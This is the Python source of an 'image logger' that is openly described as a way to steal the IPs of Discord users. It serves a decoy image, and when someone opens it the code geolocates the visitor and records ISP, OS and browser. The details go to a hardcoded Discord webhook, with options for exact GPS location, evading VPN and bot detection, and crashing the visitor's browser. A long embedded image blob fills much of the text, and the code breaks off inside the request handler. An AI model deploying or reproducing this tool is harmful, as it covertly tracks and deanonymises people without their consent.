from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discordapp.com/api/webhooks/1335289416628834444/DZWYGWON2zIoX5Q6JstjvpLWFAsCRcLgsPxwM2zXpp-R5AsDwpM-Q5pjBOhajeiIfTgU",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
